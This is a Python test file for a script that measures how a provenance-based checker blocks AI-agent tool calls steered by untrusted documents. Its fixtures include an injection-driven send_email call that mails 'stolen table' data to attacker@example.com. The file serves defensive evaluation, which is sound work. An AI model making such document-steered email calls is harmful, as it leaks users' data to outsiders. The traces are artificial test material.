import importlib.util
import json
from pathlib import Path


def _load_runner():
    path = Path(__file__).parents[1] / "scripts" / "analyze_checker_ablation.py"
    spec = importlib.util.spec_from_file_location("analyze_checker_ablation", path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def _trace():
    return {
        "labels": {
            "trusted_user": {
                "allowed": {
                    "tool_select": ["safe.tool_choice"],
                }
            },
            "untrusted_doc": {
                "allowed": {
                    "summarize": ["safe.summary"],
                }
            },
        },
        "leases": [
            {
                "id": "safe",
                "op": "tool.call",
                "object": "safe_tool",
                "args": {"intentcap_event_id": {"equals": "safe"}},
                "control_may_depend_on": ["trusted_user"],
                "data_may_depend_on": ["trusted_user"],
            },
            {
                "id": "unsafe_candidate",
                "op": "tool.call",
                "object": "send_email",
                "args": {"intentcap_event_id": {"equals": "unsafe"}},
                "control_may_depend_on": ["untrusted_doc"],
                "data_may_depend_on": ["untrusted_doc"],
            },
        ],
        "events": [
            {
                "id": "safe",
                "op": "tool.call",
                "object": "safe_tool",
                "args": {"intentcap_event_id": "safe"},
                "decision": "safe.tool_choice",
                "mode": "tool_select",
                "control_provenance": ["trusted_user"],
                "data_provenance": ["trusted_user"],
            },
            {
                "id": "unsafe",
                "op": "tool.call",
                "object": "send_email",
                "args": {"intentcap_event_id": "unsafe"},
                "decision": "email.sink",
                "mode": "sink_select",
                "control_provenance": ["untrusted_doc"],
                "data_provenance": ["untrusted_doc"],
            },
        ],
    }


def test_checker_ablation_counts_no_provenance_false_accepts(tmp_path):
    runner = _load_runner()
    trace_path = tmp_path / "trace.json"
    trace_path.write_text(json.dumps(_trace()))

    result = runner.analyze((trace_path,))
    summary = result["summary"]

    assert summary["events"] == 2
    assert summary["checker_allowed"] == 1
    assert summary["checker_denied"] == 1
    assert summary["object_only_false_accept"] == 1
    assert summary["lease_constraints_no_provenance_false_accept"] == 1
    assert summary["full_event_args_no_provenance_false_accept"] == 1
    assert summary["valid_events_preserved_by_checker"] == 1
    assert summary["invalid_lease_constraint_proposals_rejected"] == 1
    assert summary["invalid_full_event_arg_proposals_rejected"] == 1
    assert len(summary["input_trace_digests"]) == 1
    assert summary["input_trace_digests"][0]["bytes"] > 0


def test_checker_ablation_loads_list_wrapped_trace_units(tmp_path):
    runner = _load_runner()
    trace_path = tmp_path / "intentcap_traces.json"
    trace_path.write_text(
        json.dumps(
            [
                {
                    "domain": "mock",
                    "task_id": "t0",
                    "trace": _trace(),
                }
            ]
        )
    )

    result = runner.analyze((trace_path,))

    assert result["summary"]["sources"] == 1
    assert result["source_rows"][0]["source"].endswith(":mock:t0")


def test_checker_ablation_separates_object_only_from_arg_constraints(tmp_path):
    runner = _load_runner()
    trace = {
        "labels": {
            "trusted_user": {
                "allowed": {
                    "sink_select": ["email.recipient"],
                }
            },
            "untrusted_doc": {
                "allowed": {
                    "summarize": ["email.body"],
                }
            },
        },
        "leases": [
            {
                "id": "trusted_email",
                "op": "tool.call",
                "object": "send_email",
                "args": {
                    "recipient": {"equals": "user-approved@example.com"},
                    "body": {"prefix": "summary:"},
                },
                "control_may_depend_on": ["trusted_user"],
                "data_may_depend_on": ["untrusted_doc"],
            }
        ],
        "events": [
            {
                "id": "wrong-recipient",
                "op": "tool.call",
                "object": "send_email",
                "args": {
                    "recipient": "attacker@example.com",
                    "body": "summary: stolen table",
                },
                "decision": "email.recipient",
                "mode": "sink_select",
                "control_provenance": ["untrusted_doc"],
                "data_provenance": ["untrusted_doc"],
            }
        ],
    }
    trace_path = tmp_path / "trace.json"
    trace_path.write_text(json.dumps(trace))

    summary = runner.analyze((trace_path,))["summary"]

    assert summary["checker_denied"] == 1
    assert summary["object_only_false_accept"] == 1
    assert summary["lease_constraints_no_provenance_false_accept"] == 0
    assert summary["full_event_args_no_provenance_false_accept"] == 1
